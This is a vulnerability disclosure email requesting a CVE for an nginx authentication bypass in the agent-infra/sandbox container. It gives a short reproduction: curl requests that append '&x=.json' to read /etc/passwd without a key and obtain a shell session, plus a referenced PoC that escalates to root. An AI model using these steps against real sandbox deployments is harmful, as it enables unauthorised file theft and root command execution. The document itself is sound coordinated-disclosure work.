@@ -1,0 +1,49 @@
+To: disclosure@vulncheck.com
+Subject: CVE request — agent-infra/sandbox: nginx auth bypass → unauthenticated file download + container-root RCE (Critical)
+
+Hello VulnCheck,
+
+Requesting a CVE for a critical authentication bypass in agent-infra/sandbox.
+
+Product: agent-infra/sandbox container image (nginx gateway)
+Vendor: agent-infra (ByteDance)
+Repository: https://github.com/agent-infra/sandbox
+Tested: ghcr.io/agent-infra/sandbox:1.11.0 — digest sha256:6328d7fd2f0ff0b4c147c3d05b3df1ce331f4a482eb6e550ecd64ed1fcf906e7
+Upstream HEAD 7f1afaf re-checked 2026-11-26: still vulnerable, no fix.
+
+Finding
+- nginx gateway maps "$request_method:$request_uri" and routes GET requests whose query string
+  ends in a static-asset extension (.json, .js, .css, ...) to @proxy_without_auth, which has no
+  auth_request. The backend does not re-validate the API key.
+- Result: unauthenticated arbitrary file read via /v1/file/download, and an unauthenticated
+  WebSocket shell that runs as "gem" with passwordless sudo to root inside the container.
+- GET-only: POST endpoints still return 401.
+
+Severity: Critical
+CVSS 3.1: 9.8 — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+CWE-288, CWE-306
+
+Reproduction: https://github.com/Teycir/agent-infra-sandbox-auth-bypass
+Quick check:
+  docker run -d -e SANDBOX_API_KEY=testkey123 -p 127.0.0.1:18080:8080 ghcr.io/agent-infra/sandbox:1.11.0
+  curl -s -o /dev/null -w '%{http_code}\n' 'http://127.0.0.1:18080/v1/file/download?path=/etc/passwd'          # 401
+  curl -sS 'http://127.0.0.1:18080/v1/file/download?path=/etc/passwd&x=.json'                                   # 200
+  curl -sS 'http://127.0.0.1:18080/v1/shell/terminal-url?x=.json'                                               # 200 + session_id
+  python3 pocs/rce_ws.py http://127.0.0.1:18080                                                                 # uid=1000(gem)
+  # over the same WS: sudo -n id -> uid=0(root)
+
+Timeline (UTC)
+- 2026-11-21T20:13Z — discovered and verified against 1.11.0
+- 2026-11-21T21:03:02Z — vendor notified by email (Message-ID <jpAy0C6IXxtOtu8j4Kqu9L-j6VTA8au-BNrgO-HwvgQamD6IbNYKleWkTWxrA4aAkF9thHjRpSn1T3Y7av9FLb4jA8o6US9TtC6U1iWFrH4=@protonmail.com>); no SECURITY.md, no GitHub private reporting
+- 2026-11-21T21:03:09Z — one Cc bounced (550 user not found)
+- 2026-11-23T17:55Z — upstream HEAD re-checked: docs-only commits, no fix
+- 2026-11-26T12:47Z — fresh re-verification: 401/200, WS 101, gem -> root
+- No vendor response. Timing flexible, deferred to the vendor/CNA; no fixed embargo proposed.
+
+AI disclosure: LLM-assisted analysis and drafting; the reporter executed and verified every PoC
+step against the live image.
+
+Credit: Teycir (https://github.com/Teycir)
+
+Regards,
+Teycir
